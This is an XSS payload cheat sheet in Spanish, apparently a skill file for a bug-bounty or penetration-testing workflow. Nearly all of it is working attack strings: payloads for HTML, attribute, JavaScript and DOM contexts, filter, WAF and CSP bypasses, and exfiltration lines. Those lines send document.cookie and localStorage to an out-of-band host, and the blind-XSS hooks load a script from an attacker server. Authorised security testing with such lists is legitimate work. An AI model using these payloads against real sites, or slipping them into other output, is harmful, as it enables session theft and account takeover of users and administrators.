# XSS Payloads

> Ver `skills/hunt/xss`. El reflejo NO es el finding — la ejecución sí
> (screenshot / console / callback). Confirmar en browser real.

## Contexto HTML básico

```
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
```

## Contexto atributo

```
" onmouseover="alert(document.domain)        -- cierra atributo y agrega handler
'><img src=x onerror=alert(document.domain)> -- rompe el tag contenedor
javascript:alert(document.domain)            -- en atributos href/src de <a>/<iframe>
```

## Contexto JavaScript (payload dentro de <script>)

```
';alert(document.domain)//       -- string delimitado por comillas simples
";alert(document.domain)//       -- comillas dobles
</script><svg onload=alert(document.domain)>   -- rompe el bloque script (funciona
                               -- aunque el contenido esté correctamente escapado para JS)
'-alert(document.domain)-'       -- cuando hay filtro de ; y //
```

## DOM-based — sources y sinks

```
Sources: location.hash, location.search, document.referrer, window.name,
         postMessage data, localStorage
Sinks:   element.innerHTML, document.write, eval, setTimeout(string),
         location.href=, jQuery $(), React dangerouslySetInnerHTML,
         Vue v-html, Angular [innerHTML]/bypassSecurityTrust*

Probar: https://target/page#<img src=x onerror=alert(1)>
        https://target/page?x=<svg onload=alert(1)>   (si el sink lee location.search)
```

## Filter bypass

```
<scr<script>ipt>alert(1)</scr</script>ipt>     -- filtro que elimina "<script>" una vez
<ScRiPt>alert(1)</sCrIpT>                      -- case mixing
<img src=x onerror="&#97;lert(1)">             -- HTML entities en el handler
<svg/onload=alert(1)>                          -- / en vez de espacio
<img src=x onerror=alert`1`>                   -- backticks (IE/legacy)
<x onfocus=alert(1) autofocus tabindex=1>      -- handler sin evento de usuario
<iframe srcdoc="<script>alert(1)</script>">    -- anidado vía srcdoc
```

## CSP bypass (cuando hay CSP — ver hunt-csp / gotchas)

```
-- unsafe-inline presente: cualquier payload inline funciona
-- whitelisted JSONP: <script src="https://whitelisted/jsonp?callback=alert(1)">
-- AngularJS + unsafe-eval: {{constructor.constructor('alert(1)')()}}
-- base-uri ausente + relative injection: <base href="//attacker/">
-- 'strict-dynamic' mal entendido: buscar gadgets en scripts ya confiados
```

## Exfiltración (escalación — ver chain-xss-to-account-takeover)

```
<script>fetch('https://{TOKEN}.oast.host/'+document.cookie)</script>
<img src=x onerror="new Image().src='https://{TOKEN}.oast.host/?c='+document.cookie">
-- Si cookies son HttpOnly: robar tokens de localStorage:
<script>fetch('https://{TOKEN}.oast.host/',{method:'POST',body:JSON.stringify(localStorage)})</script>
```

## Stored/blind XSS (paneles admin, logs, soportes)

```
"><script src="https://{attacker}/hook.js"></script>
"><img src=x onerror="fetch('https://{TOKEN}.oast.host/?b='+location.href)">
-- Confirmar vía OAST callback (skills/core/oob-interactions); el callback
-- desde IP de admin interno demuestra ejecución en contexto privilegiado.
```

## Gotchas de uso

- Payload reflejado dentro de comentario HTML o atributo escapado = reflejo
  sin ejecución (severidad info), no XSS.
- `alert(1)` demuestra ejecución; `alert(document.domain)` demuestra dominio
  — preferir el segundo para evidencia clara del origen.
- Si el WAF bloquea payloads comunes, no insistir >3 veces con el mismo —
  mutar estructura (otro handler, otra entidad) según reglas CLI.
